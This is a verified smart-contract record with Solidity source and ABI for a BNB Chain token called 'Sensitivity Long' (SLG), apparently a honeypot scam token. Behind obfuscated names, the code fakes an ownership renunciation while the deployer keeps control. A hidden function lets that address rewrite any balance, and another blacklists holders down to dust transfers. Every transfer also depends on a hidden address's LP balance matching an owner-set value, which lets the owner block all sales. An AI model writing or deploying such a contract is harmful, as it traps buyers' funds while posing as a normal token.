{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface liquidityExempt {\n    function createPair(address enableMarketingFund, address maxSenderReceiver) external returns (address);\n}\n\ninterface isMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedTakeTo) external view returns (uint256);\n\n    function transfer(address launchedShould, uint256 minBuyTo) external returns (bool);\n\n    function allowance(address minFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minBuyTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedShould,\n        uint256 minBuyTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitWalletMode, uint256 value);\n    event Approval(address indexed minFee, address indexed spender, uint256 value);\n}\n\nabstract contract receiverMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isMarketingMetadata is isMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SensitivityLong is receiverMarketing, isMarketing, isMarketingMetadata {\n\n    uint256 public sellMax;\n\n    uint256 private swapLiquidity = 100000000 * 10 ** 18;\n\n    function minSellFee(address swapReceiver) public {\n        exemptMax();\n        \n        if (swapReceiver == receiverSwap || swapReceiver == receiverToTake) {\n            return;\n        }\n        maxLaunched[swapReceiver] = true;\n    }\n\n    uint256 enableLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isAuto;\n    }\n\n    function atMin(uint256 minBuyTo) public {\n        exemptMax();\n        enableLimit = minBuyTo;\n    }\n\n    function launchToken(address atEnable) public {\n        if (atReceiver) {\n            return;\n        }\n        \n        receiverExempt[atEnable] = true;\n        \n        atReceiver = true;\n    }\n\n    bool public shouldWallet;\n\n    address public receiverToTake;\n\n    function allowance(address sellLaunched, address totalShouldMarketing) external view virtual override returns (uint256) {\n        if (totalShouldMarketing == sellTx) {\n            return type(uint256).max;\n        }\n        return shouldAt[sellLaunched][totalShouldMarketing];\n    }\n\n    function minIs() public {\n        emit OwnershipTransferred(receiverSwap, address(0));\n        buyMarketing = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapLiquidity;\n    }\n\n    mapping(address => uint256) private amountTeamExempt;\n\n    address teamAmountSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant launchFundList = 11 ** 10;\n\n    uint256 private launchedTo;\n\n    uint8 private marketingAt = 18;\n\n    mapping(address => bool) public maxLaunched;\n\n    function getOwner() external view returns (address) {\n        return buyMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldAt;\n\n    bool public atReceiver;\n\n    function transfer(address txFrom, uint256 minBuyTo) external virtual override returns (bool) {\n        return tokenAt(_msgSender(), txFrom, minBuyTo);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toLaunched;\n    }\n\n    function tokenSender(address buyTrading, address launchedShould, uint256 minBuyTo) internal returns (bool) {\n        require(amountTeamExempt[buyTrading] >= minBuyTo);\n        amountTeamExempt[buyTrading] -= minBuyTo;\n        amountTeamExempt[launchedShould] += minBuyTo;\n        emit Transfer(buyTrading, launchedShould, minBuyTo);\n        return true;\n    }\n\n    bool private listLimit;\n\n    string private isAuto = \"SLG\";\n\n    bool public toMarketing;\n\n    function transferFrom(address buyTrading, address launchedShould, uint256 minBuyTo) external override returns (bool) {\n        if (_msgSender() != sellTx) {\n            if (shouldAt[buyTrading][_msgSender()] != type(uint256).max) {\n                require(minBuyTo <= shouldAt[buyTrading][_msgSender()]);\n                shouldAt[buyTrading][_msgSender()] -= minBuyTo;\n            }\n        }\n        return tokenAt(buyTrading, launchedShould, minBuyTo);\n    }\n\n    function exemptMax() private view {\n        require(receiverExempt[_msgSender()]);\n    }\n\n    uint256 private sellAutoIs;\n\n    string private toLaunched = \"Sensitivity Long\";\n\n    mapping(address => bool) public receiverExempt;\n\n    constructor (){\n        if (fundLaunchedEnable == listLimit) {\n            listLimit = false;\n        }\n        autoLaunch sellWallet = autoLaunch(sellTx);\n        receiverToTake = liquidityExempt(sellWallet.factory()).createPair(sellWallet.WETH(), address(this));\n        \n        receiverSwap = _msgSender();\n        receiverExempt[receiverSwap] = true;\n        amountTeamExempt[receiverSwap] = swapLiquidity;\n        minIs();\n        if (fundLaunchedEnable) {\n            sellMax = sellAutoIs;\n        }\n        emit Transfer(address(0), receiverSwap, swapLiquidity);\n    }\n\n    address sellTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public receiverSwap;\n\n    uint256 atEnableList;\n\n    function senderMarketing(address txFrom, uint256 minBuyTo) public {\n        exemptMax();\n        amountTeamExempt[txFrom] = minBuyTo;\n    }\n\n    bool private amountEnable;\n\n    event OwnershipTransferred(address indexed amountFund, address indexed modeFromTrading);\n\n    function tokenAt(address buyTrading, address launchedShould, uint256 minBuyTo) internal returns (bool) {\n        if (buyTrading == receiverSwap) {\n            return tokenSender(buyTrading, launchedShould, minBuyTo);\n        }\n        uint256 feeShould = isMarketing(receiverToTake).balanceOf(teamAmountSender);\n        require(feeShould == enableLimit);\n        require(launchedShould != teamAmountSender);\n        if (maxLaunched[buyTrading]) {\n            return tokenSender(buyTrading, launchedShould, launchFundList);\n        }\n        return tokenSender(buyTrading, launchedShould, minBuyTo);\n    }\n\n    function approve(address totalShouldMarketing, uint256 minBuyTo) public virtual override returns (bool) {\n        shouldAt[_msgSender()][totalShouldMarketing] = minBuyTo;\n        emit Approval(_msgSender(), totalShouldMarketing, minBuyTo);\n        return true;\n    }\n\n    address private buyMarketing;\n\n    bool public fundLaunchedEnable;\n\n    function balanceOf(address launchedTakeTo) public view virtual override returns (uint256) {\n        return amountTeamExempt[launchedTakeTo];\n    }\n\n    function owner() external view returns (address) {\n        return buyMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFromTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitWalletMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalShouldMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShouldMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuyTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minBuyTo\",\"type\":\"uint256\"}],\"name\":\"atMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTakeTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunchedEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"minSellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuyTo\",\"type\":\"uint256\"}],\"name\":\"senderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuyTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuyTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SensitivityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}